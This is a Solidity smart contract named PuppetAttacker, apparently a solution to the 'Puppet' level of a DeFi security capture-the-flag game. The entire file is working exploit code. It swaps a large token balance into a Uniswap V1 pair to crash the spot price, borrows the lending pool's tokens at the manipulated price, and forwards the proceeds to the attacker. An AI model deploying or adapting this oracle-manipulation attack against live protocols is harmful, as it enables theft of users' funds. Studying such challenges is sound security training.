// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface IUniswapV1 {
    function tokenAddress() external view returns(address);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns(uint256);
    function tokenToEthSwapInput(uint256 token_sold, uint256 min_eth, uint256 deadline) external returns(uint256);
}

interface IPuppetPool {
    function uniswapPair() external view returns(address);
    function token() external view returns(address);
    function borrow(uint256) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns(uint256);
    function approve(address,uint256) external returns(bool);
    function transfer(address,uint256) external returns(bool);
    function transferFrom(address,address,uint256) external returns(bool);
}

contract PuppetAttacker {
    address immutable owner;
    IUniswapV1 immutable uniswapPair;
    IPuppetPool immutable lendingPool;
    IERC20 immutable token;

    constructor(address _lendingPool) {
        owner = msg.sender;
        lendingPool = IPuppetPool(_lendingPool);
        uniswapPair = IUniswapV1(IPuppetPool(_lendingPool).uniswapPair());
        token = IERC20(IPuppetPool(_lendingPool).token());
    }

    function attack() external payable {
        // msg.sender must have sent DVT to this contract before atacking
        uint256 balance =  token.balanceOf(address(this));
        require(balance > 0, "Attacker forgot to send DVT to the contract.");
        require(address(this).balance > 0, "Attacker forgot to send ETH to the contract.");
        token.approve(address(uniswapPair), balance);

        // Heavily unbalance the pool
        // balance-1 so the test passes, it need strict inequality
        uniswapPair.tokenToEthSwapInput(balance-1, 1, block.timestamp);

        uint256 ethBalance = address(this).balance;

        // Get price for 1 token from the lending pool
        uint256 price = lendingPool.calculateDepositRequired(1 ether);
        // Compute how much we can get with our current balance
        uint256 maxCurrent = ethBalance * 10**18 / price;
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));

        // Get as much as possible for the price
        uint256 maxBorrowable = maxCurrent < lendingPoolBalance ? maxCurrent : lendingPoolBalance;

        lendingPool.borrow{value: ethBalance}(maxBorrowable);

        // Give everything back to the attacker
        token.transfer(owner, token.balanceOf(address(this)));
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable{}
}